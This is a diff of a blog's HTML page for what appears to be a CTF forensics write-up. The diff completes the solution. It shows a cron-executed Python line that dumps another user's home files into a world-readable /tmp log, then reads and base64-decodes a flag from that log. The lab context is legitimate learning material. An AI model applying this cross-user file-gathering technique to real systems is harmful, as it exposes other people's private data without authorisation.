@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (116)</a></li>
+                                      (117)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -703,10 +703,29 @@ import os
 os.system<span class="o">(</span><span class="s2">"cat /home/cypher/*.* &gt; /tmp/gather.log"</span><span class="o">)</span>
 </pre></div>
 <p>This should do the trick. Now we'll have to wait for the script to get executed. Every 3 minutes means that
-the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.  </p>
-<blockquote>
-<p>Due to some bug related to this challenge, I wasn't able to get the flag yet :) I'm still waiting for the bug to get fixed :D</p>
-</blockquote>
+the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.</p>
+<p>Now wait some time till you see:</p>
+<div class="highlight"><pre><span></span>morpheus@forensics:/var/tmp$ ls -l /tmp/gather.log
+-rwxrwxrwx <span class="m">1</span> cypher cypher <span class="m">8256</span> Nov <span class="m">11</span> 06:10 /tmp/gather.log
+</pre></div>
+<p>Now let's get the content:</p>
+<div class="highlight"><pre><span></span>morpheus@forensics:/var/tmp$ cat /tmp/gather.log
+python /tmp/Gathering.py <span class="p">&amp;</span>
+sleep 5
+<span class="nb">echo</span> <span class="s2">"import os"</span> &gt; /tmp/Gathering.py
+<span class="nb">echo</span> <span class="s2">"os.system('ps aux &gt; /tmp/28JNvE05KBltE8S7o2xu')"</span> &gt;&gt; /tmp/Gathering.py
+chmod <span class="m">777</span> /tmp/Gathering.py
+
+BASE ?
+<span class="nv">RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego</span><span class="o">=</span>
+...
+</pre></div>
+<p>And the flag is:</p>
+<div class="highlight"><pre><span></span>$ <span class="nb">echo</span> <span class="s2">"RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego="</span> <span class="p">|</span> base64 -d
+FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
+</pre></div>
+<p>Now I can also see why I had troubles executing my python script: <code>/tmp/Gathering.py</code> is being executed and then after 5 seconds 
+the content of the file gets replaced. </p>
                 </div>
 <hr/>
 <div style="float:left;">
@@ -750,7 +769,7 @@ the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :2
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/admin/">admin</a><sup>24</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/linux/">linux</a><sup>22</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/linux/">linux</a><sup>23</sup></div>
                 </div>
 
                 <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
